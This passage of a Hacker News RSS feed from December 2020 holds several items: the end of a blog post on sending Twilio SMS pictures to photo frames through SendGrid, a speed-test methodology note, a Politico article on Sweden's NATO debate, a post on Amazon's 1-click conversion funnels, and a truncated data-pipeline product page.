<p>Here’s the <a href="https://pipedream.com/@mjclemente/sms-pictures-to-email-p_wOCgyw1">Pipedream workflow for converting Twilio SMS pictures to SendGrid email attachments</a>. If you’re logged into Pipedream, you should see an option to copy this into your account. Once copied into your account, there are a few more steps required before you can actually use the workflow.</p>

<p>First, you’ll first need to connect your Twilio account. Pipedream provides instructions regarding what information is required. Note that you’ll only need a standard API key.</p>

<p>Once you’ve linked Twilio, you’ll need to select the number from your account that you want to use as the workflow trigger. That is, when an SMS is received at this number, the workflow will be run, with the message content available as input. To complete the trigger, you’ll also need to enter your Twilio Auth Token; the “SMS Response Message” field can be left blank. Finally, give it a name (like “Family Incoming SMS”) and click Create Source. This takes a few seconds to complete,</p>

<p>You’re not quite done with this step yet; the trigger is created, but you also need to enable it. This is done by toggling the On/Off button on the top right of the trigger card. Once enabled, the workflow is ready to run for new events (SMS messages).</p>

<p>You’ll then need to connect SendGrid. This is a matter of <a href="https://sendgrid.com/docs/ui/account-and-settings/api-keys/#creating-an-api-key">creating a new API key</a> to allow Pipedream access to use your SendGrid account. This API key only needs Restricted Access (full access to “Mail Send”).</p>

<p>Finally, with SendGrid connected, you just need to fill in the parameters required to send the email:</p>

<ul>
  <li><strong>To email</strong>: Either your multi-frame account email address or a comma separated list of the email addresses of all the individual frames.</li>
  <li><strong>Subject</strong>: This is being sent to the frame email address, so it’s not visible, but it is required. I’m currently using “New Picture from {{steps.trigger.event.From}}”.</li>
  <li><strong>From email</strong>: An email address that you’ve verified with SendGrid (or from a domain that you’ve verified).<sup id="fnref:4" role="doc-noteref"><a href="#fn:4">4</a></sup></li>
  <li><strong>Type</strong>: Just set it to “text/plain”.</li>
  <li><strong>Value</strong>: This is the body of the email, and as with the Subject, it isn’t really being used, but it is required. I set it to “More pictures have been shared by {{steps.trigger.event.From}}”.</li>
</ul>

<p>You can then Save the workflow, and then Deploy it. You’re ready to give it a test! Text a picture to the Twilio/Shared Photos number that you set up and it should, in a matter of minutes, appear on all the photo frames. Honestly, it was a bit of a rush the first time it worked for me.</p>

<h2 id="problems-and-limitations">Problems and Limitations</h2>

<p>This flow for handling the SMS picture-to-frame was put together quickly, and has a handful of obvious shortcomings. While some are fixable, with a bit more work, others are just inherent in the process:</p>

<ul>
  <li>
    <p><strong>Frames are expensive</strong>. No real way around this. You might try to cut costs a little with repurposed tablets, but I didn’t have enough time to explore that route.</p>
  </li>
  <li>
    <p><strong>Frame software problems</strong>. As mentioned above, we used Pix-Star photo frames. And while the process worked, there were two issues worth noting:</p>

    <ul>
      <li>First, we found that an occasional photo would not make it to all the frames. I reached out to the Pix-Star support, who were very nice, but had not idea why this was happening and were not able to resolve it. Definitely a source of frustration.</li>
      <li>Second, the Pix-Star interface was less than ideal, which made it difficult to manage the frames/pictures from the web. Along with being a bit slow and clunky, there was no way to make sure that the frame and web stayed in sync - a photo could be deleted on the web, but remain on the frame.</li>
    </ul>

    <p>I’m not sure how the experience would be different with other frame providers.</p>
  </li>
  <li>
    <p><strong>Picture quality is reduced.</strong> Because we’re sending MMS, network carriers limit the size of the message/files. So, a 3MB photo from your phone might end up compressed to 800KB by the carrier. Consequently, it’s best to only send one picture at a time.<sup id="fnref:5" role="doc-noteref"><a href="#fn:5">5</a></sup></p>

    <p>Now, I should note that we didn’t find this to be a problem. While lower quality than the originals, the resulting images were good enough for the size they were displayed at, especially in collage-mode.</p>
  </li>
  <li>
    <p><strong>Workflow doesn’t delete the images from Twilio.</strong> I haven’t gotten around to including this step in the workflow. <a href="https://www.twilio.com/docs/sms/tutorials/how-to-receive-and-download-images-incoming-mms-node#delete-media-from-twilio">It’s possible</a>, but I was rushed, and this seemed the least important thing to implement. Just keep it in mind. I believe they’re automatically deleted after 13 months, and there are also tools that use the Twilio API to automate the process.</p>
  </li>
</ul>

<h2 id="wrapping-it-up">Wrapping it up</h2>

<p>Not much else to say here, except that our family enjoyed this so much that we’ve continued to use the SMS-to-frame sharing, even after Thanksgiving. We’ve kept the frames up, and while we’re not sending pictures as frequently as we did on the holiday, sharing little moments of daily life is still delightful.</p>

<hr>



</div>


	



    </div></div>]]>
            </description>
            <link>https://blog.mattclemente.com/2020/12/22/sharing-pictures-sms-smart-frame.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25507078</guid>
            <pubDate>Tue, 22 Dec 2020 15:25:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[US is 23rd worldwide for internet speed, UK 31st, according to user speed tests]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25507060">thread link</a>) | @mootothemax
<br/>
December 22, 2020 | https://fairinternetreport.com/research/internet-speed-by-country | <a href="https://web.archive.org/web/*/https://fairinternetreport.com/research/internet-speed-by-country">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div><p>We analyzed the Web100, NDT5, and NDT7 datasets from <a href="https://www.measurementlab.net/">Measurement Lab</a> - excluding "noisy" results, including those from Cellular connections via <a href="https://www.maxmind.com/en/geoip2-connection-type-database">MaxMind's Connection Type database</a>, and results slower than 10kbps - using <a href="https://cloud.google.com/bigquery">Google BigQuery</a>, creating a custom set of speed test data broken down by region, country and city, covering the years 2019 and 2020. </p><p> Counties with fewer that 5,000 tests/year were excluded from our rankings; we consider 5,000 tests/yeat to be a low bar for country statistics to cross, and that any counties with fewer tests could not be reliably ranked. </p><p> The custom dataset was imported into Microsoft SQL Server for rapid-access querying, and the resulting graphs used on this page were created in <a href="http://www.visualdatatools.com/DataGraph/">DataGraph</a>. </p></div></div></div></div></div>]]>
            </description>
            <link>https://fairinternetreport.com/research/internet-speed-by-country</link>
            <guid isPermaLink="false">hacker-news-small-sites-25507060</guid>
            <pubDate>Tue, 22 Dec 2020 15:24:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Sweden edges closer to NATO membership]]>
            </title>
            <description>
<![CDATA[
Score 89 | Comments 142 (<a href="https://news.ycombinator.com/item?id=25506945">thread link</a>) | @Tomte
<br/>
December 22, 2020 | https://www.politico.eu/article/sweden-nato-membership-dilemma/ | <a href="https://web.archive.org/web/*/https://www.politico.eu/article/sweden-nato-membership-dilemma/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
									
							<div id="amazon-polly-audio-table">
				<p>Press play to listen to this article</p>
				
		</div>
<p>STOCKHOLM — Sweden is rethinking its security, and whether it really is safest outside NATO.</p>



<p>Two years out from the next election, debate over whether to join the Western defense alliance is intensifying, setting up a left-versus-right clash on the question in 2022.&nbsp;</p>



<p>The current minority government of Social Democrats and Greens — plus their allies the Left Party — remain staunchly against, citing the value of neutrality in what they see as a polarizing world.</p>



<p>On the other side, four traditionally allied center-right parties — the Moderate Party, the Liberals, the Center Party and the Christian Democrats — are in favor, saying Sweden needs the security of the defense guarantees that NATO membership offers.&nbsp;</p>



<p>The pro-NATO side scored a big win last week when the far-right Sweden Democrats, who are angling for closer cooperation with the center-right bloc in a range of policy areas, reversed a previous anti-NATO stance and backed a motion for Sweden to adopt a so-called NATO option — allowing it to join NATO at some point in the future.&nbsp;Parliament voted in favor of the motion by 204 votes to 145.&nbsp;</p>



<p>“Issues of defense don’t normally sit high on the agenda in elections here, but since the Sweden Democrats have now moved their position, we could well see more interest,” said Allan Widman, a lawmaker with the Liberal Party and spokesman on defense policy.&nbsp;</p>



<p>Adopting a “NATO option” is not a commitment to join — Finland has had such an option since 1995 and remains outside the pact — but is widely seen as a movement in that direction. The government has acknowledged as much by so far refusing to act on it.&nbsp;</p>



<p>Foreign Minister Ann Linde called parliamentary backing for the move “a significant negative event for Swedish security.”</p>



<p>For Sweden, joining NATO would be a big policy shift, as it would end more than 200 years of official military neutrality. The country has not formally taken sides in a war since Napoleon was advancing across Europe, and has over recent years sought to carve out a diplomatic role as an impartial international arbiter while at the same time developing a closer partnership with NATO.&nbsp;</p>



<p>Swedish NATO membership would also shake up a delicate balance of power in the volatile Baltic Sea region, where officially unaligned Sweden and Finland and NATO members Denmark, Germany, Poland and the Baltic states regularly face off against Russia.&nbsp;</p>



<p>In August, Sweden <a rel="noreferrer noopener" href="https://www.politico.eu/article/security-alert-sweden-gotland-cold-war-memories/" target="_blank">deployed</a> troops to its Baltic island of Gotland after a security scare triggered by Russian warships sailing close to the island.&nbsp;</p>



<p>Russian military jets regularly enter Swedish airspace without permission and many pointed the finger at Russia when a mysterious submarine was detected in waters close to the capital Stockholm in 2014.</p>



<p>Analysts say that last week’s vote in the Swedish parliament on the NATO option likely signals the start of a new phase in the wrangling over full entry into the alliance.&nbsp;</p>



<p>“We can now expect a more comprehensive political debate about an eventual Swedish membership,” Calle Håkansson, an analyst at the think tank the Swedish Institute of International Affairs, told public service television.&nbsp;</p>



<p>The arguments of both sides are already clear. The Social Democrats’ resistance is based on a long-held belief that Sweden’s “freedom from alliances,” as the party calls it, has served the country well.&nbsp;</p>



<p>Defense Minister Peter Hultqvist has engineered a range of joint training exercises with NATO, such as the cold weather <a rel="noreferrer noopener" href="https://shape.nato.int/news-archive/2019/nato-allies-participate-in-swedish-exercise-northern-wind" target="_blank">exercise </a>Northern Wind in Sweden in March 2019, but at every turn, he has sought to underline Swedish independence.</p>



<p>The Social Democrats say that joining NATO would represent unnecessary antagonization of Russia, and risk destabilizing an already tense security situation along Europe’s eastern flank.&nbsp;</p>



<p>“We don’t want to go down a road of security policy experiments or adventurism,” Hulqvist <a href="https://www.dn.se/debatt/m-tycks-vara-ensidigt-fokuserade-pa-nato-medlemskap/" target="_blank" rel="noreferrer noopener">wrote</a> in an editorial in August.&nbsp;</p>



<p>Meanwhile, Widman, of the pro-NATO Liberals, said Sweden’s strategy has left it in a security “no-man’s land,” viewed by Russia as part of the “European security system” but lacking the guarantee of the NATO members’ commitment to mutual defense.</p>



<p>“That is a very dangerous position to find yourself in,” he said.&nbsp;</p>



<p>While public support for NATO membership in Finland has remained low and steady, in Sweden it has been rising.&nbsp;</p>



<p>Research by Gothenburg University’s SOM Institute <a rel="noreferrer noopener" href="https://www.gu.se/sites/default/files/2020-06/7.%20Swedish%20trends%20%281986-2019%29_v2.pdf" target="_blank">shows</a> roughly equal support (around 30 percent) for joining NATO as those opposed. In 1994, when the SOM Institute began researching the question, 48 percent said joining was a bad idea versus 15 percent in favor.&nbsp;</p>



<p>How the issue develops will depend on the rival sides’ abilities to convince voters ahead of the 2022 vote. If the pro-NATO side does well at the polls and knock the minority center-left incumbents out of power, they could push for a referendum on the question, experts say.&nbsp;</p>



<p>Moderate Party leader Ulf Kristersson has previously said that he believes Sweden will be a member of NATO before the decade is out and he called the NATO option vote “historic.” In a social media <a rel="noreferrer noopener" href="https://www.instagram.com/p/CIkl1Cdp4IU/" target="_blank">post</a>, he said it would allow Sweden to “update and modernize” its security stance and tell the world that Sweden is ready to join NATO at a future point of its choosing.</p>



<p>“A government can’t just look away from a parliamentary majority view in a foreign policy or security question,” he said. “We expect the government to get behind the parliament’s security policy line.”</p>
								</div></div>]]>
            </description>
            <link>https://www.politico.eu/article/sweden-nato-membership-dilemma/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25506945</guid>
            <pubDate>Tue, 22 Dec 2020 15:12:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How Amazon increases conversions with short circuits]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25506940">thread link</a>) | @jakevoytko
<br/>
December 22, 2020 | https://notmagic.tech/posts/0002-increase-conversions-with-short-circuits | <a href="https://web.archive.org/web/*/https://notmagic.tech/posts/0002-increase-conversions-with-short-circuits">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><img alt="The little red lighthouse under the George Washington Bridge" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async"></p></div><p><span>📅 <!-- -->December 22, 2020</span><span>⏱ <!-- -->5 minutes</span></p><div><h2>In this issue</h2>
<p>Learn how Amazon uses "1-click" purchases to shortcut their conversion funnel. Brainstorm
how you can use this principle to improve your business.</p>
<h2>Buying a Kindle book</h2>
<p>I regularly encounter two different purchase flows on Amazon: one is for physical items,
and the other for digital goods.</p>
<p>I see two buttons when I visit the listing for a physical book:</p>
<ul>
<li>"Add to cart": mark the item for purchase and continue shopping</li>
<li>"Buy now": Skip straight to checkout.</li>
</ul>
</div><div><div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async"></p></div></div><p>I only see a single button when I buy a digital book for Kindle: "Buy now with 1-click®"
Clicking that button purchases the item and pre-downloads it onto my device. I also have
the option to download it on my other devices.</p><div><div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async"></p></div></div><div><p>Digital downloads default to the 1-click flow because this is a better experience for users
and improves Amazon's bottom line. Before we learn how to apply this to our own business,
let's chat about conversion funnels. If you're already a conversion expert, then please
skip to the section "Why Amazon's Kindle short-circuit works," which will have an actionable
takeaway for your business.</p>
<h2>Conversion funnels 101</h2>
<p>A "funnel" is a journey that the customer takes to buy a product. The goal
is to exchange the customer's money for goods or services. When they successfully complete
a transaction, this is called a "conversion."</p>
<p>Let's look at a case study: a buyer wants to buy a physical copy of "A Promised Land" by
Barack Obama.</p>
<p>Let's say they start on Google and type, "barack obama a promised land". They
see that the top two results are for barnesandnoble.com and amazon.com. They
open up the results for barnesandnoble.com and amazon.com in different tabs to
compare. They like the Amazon result better, so they close the Barnes and Noble
tab, add the book to their cart, go through the checkout flow, and purchase it.</p>
<p>Both sites have a "funnel" consisting (approximately) of the following actions the user
must perform to successfully convert:</p>
<ul>
<li>The user searches search for a book.</li>
<li>They click the search result, entering the site.</li>
<li>They select the quantity and variation and clicks "Add to cart".</li>
<li>They navigate to the cart.</li>
<li>They enter (or confirm) their address and payment method.</li>
<li>They click "check out" and successfully complete the order.</li>
</ul>
<p>In this example, the user bounces from barnesandnoble.com on the third step (they never
add to cart), but the user goes through the full flow to convert on amazon.com.</p>
<p>Users will drop off at every step. Sometimes you don't have control over this: users learned
enough about the item that they realized they didn't want it. You were never going to get
this sale.</p>
<p>Sometimes you can influence the outcome: many users want to complete the purchase
but fail because it takes too long. Imagine a major distraction, like a toddler charging
into a room and demanding attention by screaming. You are racing against this toddler when
you have a conversion flow. The user has to convert before their attention is ripped from
them.</p>
<p>Anyways, let's add some hypothetical numbers to this purchasing flow.</p>
</div><div><table><thead><tr><th>Step</th><th>Conversion Rate</th><th>Users after step</th></tr></thead><tbody><tr><td>See the link in search</td><td>1</td><td>1000</td></tr><tr><td>Click on search results</td><td>0.2</td><td>200</td></tr><tr><td>Add to cart</td><td>0.4</td><td>80</td></tr><tr><td>Go to cart</td><td>0.8</td><td>64</td></tr><tr><td>Enter information</td><td>0.9</td><td>57</td></tr><tr><td>Check out</td><td>0.95</td><td>54</td></tr></tbody><caption>54<!-- --> of 1000 users convert in this hypothetical funnel</caption></table></div><div><p>Out of 1000 searchers and 200 site visitors, we're saying that 27% of people who visit the
site will convert. I don't have good intuition for whether this number would be "good" or
"bad" for Amazon for this particular flow, but it would be shockingly high for many sites.
But this particular flow is high-intent, since the buyer intends to purchase a specific
book right now. Different visits have different levels of intent. Buyers who land on a
specific offering from search have higher intent to buy than someone browsing recently
published books.</p>
<p>There's a consolation prize for conversion funnels, and it's that buyers are more
likely to buy as they progress through the funnel. I modeled this as the rate
going strictly up. This won't be true for all (or maybe most) funnels, but the specifics
don't matter much for the lesson here.</p>
<h2>Why Amazon's Kindle digital short-circuit works</h2>
<p>The 1-click button skips the "add to cart", "go to cart", and "complete checkout" steps.
Even if these steps have extremely high conversion rates, their conversion rate is even
better when you just skip them entirely.</p>
<p>This speaks to the difference between digital and physical goods. It's easy
to imagine failure modes for physical goods. When you purchase an item, Amazon
must create a plan for moving a real item from the warehouse where it started
to your house. If it's in transit, and you decide that you don't want it anymore,
they can't just say "nevermind." It's hard to walk back from it being on a shipping truck
across the country. On the other hand, digital downloads are ephemeral. It's not
a big deal if someone asks for a refund. Amazon can verify that they didn't
download the item (or they didn't even open the book on Kindle,) then they can
just cancel the transaction and almost pretend like nothing happened.</p>
<p>"1-click" is a tremendous shortcut. It means that anyone who signals intent to purchase by
clicking "Buy now" will be more likely to convert. You almost always win the race against
the screaming toddler.</p>
<p>Let's say that 5% fewer people click the "1-click" button when it's an instant purchase.
After all, some people use their shopping carts as a bookmark folder and have no intention
of buying the item.</p>
</div><div><table><thead><tr><th>Step</th><th>Conversion Rate</th><th>Users after step</th></tr></thead><tbody><tr><td>See the link in search</td><td>1</td><td>1000</td></tr><tr><td>Click on search results</td><td>0.2</td><td>200</td></tr><tr><td>Click Buy Now</td><td>0.35</td><td>70</td></tr></tbody><caption>70<!-- --> of 1000 users convert in this hypothetical funnel</caption></table></div><div><p>About 16 more conversions than before. This doesn't sound like much. But realize
that this particular journey would have a <strong>29% conversion rate improvement</strong> using a "Buy
now" checkout with these particular numbers. Even if the rate weren't as high (maybe people
are less likely correct a failed payment in this mode, maybe more people ask for refunds
because of misclicks, maybe many fewer people will click it), it's still likely to be a
substantial win in this particular path because you have 29% to play with.</p>
<p>In fact, this principle works so well that they use it in their physical checkout flow! Go
look again. The "Buy it now" button also skips the "Add to cart" step. Amazon really wants
to shave off steps whenever possible, even if it requires giving the user extra choices.</p>
<h2>Twitter summary thread</h2>
</div><blockquote><div lang="en" dir="ltr"><p><a href="https://t.co/QGIOG19H84">https://t.co/QGIOG19H84</a></p><p>Learn how Amazon uses "One click" purchases to shortcut their conversion funnel. Brainstorm how you can use this principle to improve your business.</p><p>👇👇👇</p></div>— It's Not Magic (@its_not_magic) <a href="https://twitter.com/its_not_magic/status/1341393341783691264?ref_src=twsrc%5Etfw">December 22, 2020</a></blockquote> <div><h2>When can we use this?</h2>
<p>Consider offering a user the chance to skip steps when they signal intent. It's not always
the right thing to do, but the cost is often low.</p>
<p>Imagine a user starts off on a pricing page for a plan, and then moves to other parts of
your site. Later in the visit, you could show them a banner with a deal for that plan -
2 months off with the purchase of a 1 year plan. This moves the user away from the
(blog ➡ plans ➡ compare ➡ checkout) flow and straight to checkout.</p>
<p>If a customer adds something to their cart and then bounces, send them an email reminding
them that they had the item in their cart and offer to take them straight to checkout.
This takes your funnel from (??? ➡ site ➡ plans ➡ compare ➡ checkout) and turns it into
(email ➡ checkout).</p>
<p>Make sure that you understand what your conversion funnel looks like. It'll be harder to
short-circuit something that you haven't formalized.</p>
<p>It's possible to take this too far. Do not take this too far. I'm waiting
for the day that I read a news article about some CEO who thinks, "We have all
these credit cards on file, and our recommendation algorithm is really good.
We can buy people things that we're 100% confident that they will like." Do not
be this CEO. <a href="https://xkcd.com/1494/">That "growth hack" they just thought of is called "credit card
fraud" and it is a crime</a></p>
</div><div><div><div><div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async"></p></div><p>Jacob Voytko</p></div><div><div><p>Ahoy everyone 👋 I'm Jacob. If you've worked with me before,
then you know that I love spreadsheets and digging to find answers with numbers.
I made this newsletter to demonstrate one simple thing: you don't need to be a
math whiz to get some useful insights. All you need is a
question and some determination.</p>
<p>I'm just setting out on my journey as an indie hacker. Previously, I worked at
Etsy as a staff software engineer. Before that, I worked on Google Docs.</p>
</div></div></div></div><div><div><p>We will never spam you 😌</p></div></div></div></div>]]>
            </description>
            <link>https://notmagic.tech/posts/0002-increase-conversions-with-short-circuits</link>
            <guid isPermaLink="false">hacker-news-small-sites-25506940</guid>
            <pubDate>Tue, 22 Dec 2020 15:11:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Automate data pipeline creation in minutes]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25506864">thread link</a>) | @steveeast112
<br/>
December 22, 2020 | https://phiona.com/developers | <a href="https://web.archive.org/web/*/https://phiona.com/developers">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-nc-base="header" data-controller="AncillaryLayout">
      

      

      <div>

        

        <div>
          
            
              
                
                  
                
              
            
          

          <main>
            
              <section data-content-field="main-content">
                <div data-type="page" data-updated-on="1608585610408" id="page-5fdb74c3ca12287942885937"><div><div><div><div><div data-block-type="2" id="block-a05cf873aa9d26583a73"><p><h2>Stop wasting time searching for clean datasets, boring wrangling tasks, and pipeline troubleshooting. Use Phiona to spend more time using your data instead of preparing it.</h2></p></div></div></div><div><div><div data-block-type="2" id="block-8b39e5b79306ae1f4000"><p><h3>Trusted by innovative teams at</h3></p></div><div data-aspect-ratio="10.393258426966293" data-block-type="5" id="block-08ca795ee8cc8f020e5f"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5b8e9fc3506fbeb4312d3729/1598628068502-VYJP524RL8KH211A3NCG/ke17ZwdGBToddI8pDm48kNaYRLG9rKUlFFufJWcco4IUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYy7Mythp_T-mtop-vrsUOmeInPi9iDjx9w8K4ZfjXt2drl-Iw5on9671eGDf40NAtFzJ8Aan9v7kOLRiuHPM-M6CjLISwBs8eEdxAxTptZAUg/logos0820.png" data-image="https://images.squarespace-cdn.com/content/v1/5b8e9fc3506fbeb4312d3729/1598628068502-VYJP524RL8KH211A3NCG/ke17ZwdGBToddI8pDm48kNaYRLG9rKUlFFufJWcco4IUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYy7Mythp_T-mtop-vrsUOmeInPi9iDjx9w8K4ZfjXt2drl-Iw5on9671eGDf40NAtFzJ8Aan9v7kOLRiuHPM-M6CjLISwBs8eEdxAxTptZAUg/logos0820.png" data-image-dimensions="1847x241" data-image-focal-point="0.5,0.5" alt="logos0820.png" data-load="false" data-image-id="5fdb74c3ca12287942885907" data-type="image" src="https://phiona.com/logos0820.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div></div></div><div><div><div data-block-type="5" id="block-5c4ea2ce0033db55dae7"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5b8e9fc3506fbeb4312d3729/1556109667516-DNZR7DIU2FTVEB99KMP4/ke17ZwdGBToddI8pDm48kAKgoLjNQ6aJ1OnxYPBg4sFZw-zPPgdn4jUwVcJE1ZvWhcwhEtWJXoshNdA9f1qD7UnCxNA8dHvmd7460Z7fbKGEzcjpSdFU6DwkSIQwBDOi_nLKPUGQem99tOczItW9iQ/yesno_150.png" data-image="https://images.squarespace-cdn.com/content/v1/5b8e9fc3506fbeb4312d3729/1556109667516-DNZR7DIU2FTVEB99KMP4/ke17ZwdGBToddI8pDm48kAKgoLjNQ6aJ1OnxYPBg4sFZw-zPPgdn4jUwVcJE1ZvWhcwhEtWJXoshNdA9f1qD7UnCxNA8dHvmd7460Z7fbKGEzcjpSdFU6DwkSIQwBDOi_nLKPUGQem99tOczItW9iQ/yesno_150.png" data-image-dimensions="125x125" data-image-focal-point="0.5,0.5" alt="yesno_150.png" data-load="false" data-image-id="5fdb74c3ca12287942885913" data-type="image" src="https://phiona.com/yesno_150.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-93a61b2570662620499b"><div><h2><strong>Simple</strong></h2><p>A visual development interface makes it easy to build complex data pipelines with minimal code.</p></div></div></div><div><div data-block-type="5" id="block-7005228778f7616fa562"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5b8e9fc3506fbeb4312d3729/1556112241966-9EE3U8DU8HDMOY7MUXX4/ke17ZwdGBToddI8pDm48kAKgoLjNQ6aJ1OnxYPBg4sFZw-zPPgdn4jUwVcJE1ZvWhcwhEtWJXoshNdA9f1qD7UnCxNA8dHvmd7460Z7fbKGEzcjpSdFU6DwkSIQwBDOi_nLKPUGQem99tOczItW9iQ/ds_Time.png" data-image="https://images.squarespace-cdn.com/content/v1/5b8e9fc3506fbeb4312d3729/1556112241966-9EE3U8DU8HDMOY7MUXX4/ke17ZwdGBToddI8pDm48kAKgoLjNQ6aJ1OnxYPBg4sFZw-zPPgdn4jUwVcJE1ZvWhcwhEtWJXoshNdA9f1qD7UnCxNA8dHvmd7460Z7fbKGEzcjpSdFU6DwkSIQwBDOi_nLKPUGQem99tOczItW9iQ/ds_Time.png" data-image-dimensions="125x125" data-image-focal-point="0.5,0.5" alt="ds_Time.png" data-load="false" data-image-id="5fdb74c3ca12287942885916" data-type="image" src="https://phiona.com/ds_Time.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-796aaafd35e1496b207a"><div><h2><strong>Quick</strong></h2><p>Reduce the time needed to wrangle and automate your data work by up to 90%.</p></div></div></div><div><div data-block-type="5" id="block-169e103b7813d743b068"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5b8e9fc3506fbeb4312d3729/1556112343044-A6ED2T8PX818LZ49DEVH/ke17ZwdGBToddI8pDm48kAKgoLjNQ6aJ1OnxYPBg4sFZw-zPPgdn4jUwVcJE1ZvWhcwhEtWJXoshNdA9f1qD7UnCxNA8dHvmd7460Z7fbKGEzcjpSdFU6DwkSIQwBDOi_nLKPUGQem99tOczItW9iQ/bc_exploration.png" data-image="https://images.squarespace-cdn.com/content/v1/5b8e9fc3506fbeb4312d3729/1556112343044-A6ED2T8PX818LZ49DEVH/ke17ZwdGBToddI8pDm48kAKgoLjNQ6aJ1OnxYPBg4sFZw-zPPgdn4jUwVcJE1ZvWhcwhEtWJXoshNdA9f1qD7UnCxNA8dHvmd7460Z7fbKGEzcjpSdFU6DwkSIQwBDOi_nLKPUGQem99tOczItW9iQ/bc_exploration.png" data-image-dimensions="125x125" data-image-focal-point="0.5,0.5" alt="bc_exploration.png" data-load="false" data-image-id="5fdb74c3ca12287942885919" data-type="image" src="https://phiona.com/bc_exploration.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-d79557007687e3f32be6"><div><h2><strong>Shareable</strong></h2><p>Make updated datasets available via REST API, scheduled emails, or database updates.</p></div></div></div></div><div data-block-type="5" id="block-6ee586293a2570e83d86"><div>








  

    

      <figure data-scrolled="" data-test="image-block-v2-outer-wrapper">

        <div>
          
            <div data-animation-role="image" data-description="" data-animation-override="">
            
            <p><img data-src="https://images.squarespace-cdn.com/content/v1/5b8e9fc3506fbeb4312d3729/1599231156688-MKEJ28A2O4BHB5NLT5HU/ke17ZwdGBToddI8pDm48kD3dMZg4N0_7yQbmB8aGnRAUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYxCRW4BPu10St3TBAUQYVKchuoFp51Zn2NKlmB0zEAPtYHxsMM9UBX7ODbp6nqB1kCWiY39Atxpq51N24fh7yK2/integrationsv2.png" data-image="https://images.squarespace-cdn.com/content/v1/5b8e9fc3506fbeb4312d3729/1599231156688-MKEJ28A2O4BHB5NLT5HU/ke17ZwdGBToddI8pDm48kD3dMZg4N0_7yQbmB8aGnRAUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYxCRW4BPu10St3TBAUQYVKchuoFp51Zn2NKlmB0zEAPtYHxsMM9UBX7ODbp6nqB1kCWiY39Atxpq51N24fh7yK2/integrationsv2.png" data-image-dimensions="1147x995" data-image-focal-point="0.5,0.5" alt="integrationsv2.png" src="https://phiona.com/integrationsv2.png"></p>
          
            </div>
          

        </div>

        
          
          <figcaption data-width-ratio="">
            <div>

              
                <div><p>Connect to your online and offline data</p></div>
              

              
                <div><p>Seamlessly connect your data within a virtual data mesh, without changing the underlying detail. No more tracking down loose CSV files or credentials for rogue databases.</p></div>
              

              
                <div><div></div></div>
              

            </div>
          </figcaption>
        

      </figure>

    

  


</div></div><div data-block-type="5" id="block-8c9f808f8dd8365fafbd"><div>








  

    

      <figure data-scrolled="" data-test="image-block-v2-outer-wrapper">

        <div>
          
            <div data-animation-role="image" data-description="" data-animation-override="">
            
